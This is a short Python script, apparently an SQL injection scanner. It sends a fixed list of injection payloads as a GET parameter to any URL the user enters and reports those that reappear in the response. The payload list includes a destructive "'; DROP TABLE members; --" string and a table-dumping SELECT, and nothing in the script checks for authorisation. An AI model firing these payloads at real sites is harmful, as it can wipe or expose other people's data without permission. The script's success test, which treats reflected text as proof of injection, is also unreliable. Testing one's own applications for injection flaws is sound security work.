#!/usr/bin/python3

import requests

# List of payloads for SQL Injection
sql_payloads = ["' OR '1'='1'", "' OR '1'='2", "' OR 'a'='a", '" OR "a"="a', "' OR 'x'='x'; --", "' OR 1=1; --", "' OR 'x'='x'; DROP TABLE members; --", "' OR 'x'='x'; SELECT * FROM members; --"]

def send_request(url, payload):
    try:
        # Send a GET request to the URL with the payload
        response = requests.get(f"{url}?param={payload}")
        return payload in response.text
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def scan_vulnerability(url, payloads, vulnerability):
    total = len(payloads)
    success = 0
    for payload in payloads:
        if send_request(url, payload):
            success += 1
            print(f"Potential {vulnerability} detected at {url} with payload {payload}")
    failed = total - success
    print(f"{vulnerability} - Total payloads: {total}, Success: {success}, Failed: {failed}")

def scan_website(url):
    scan_vulnerability(url, sql_payloads, "SQL Injection")

if __name__ == "__main__":
    url = input("Enter the URL to scan: ")
    scan_website(url)

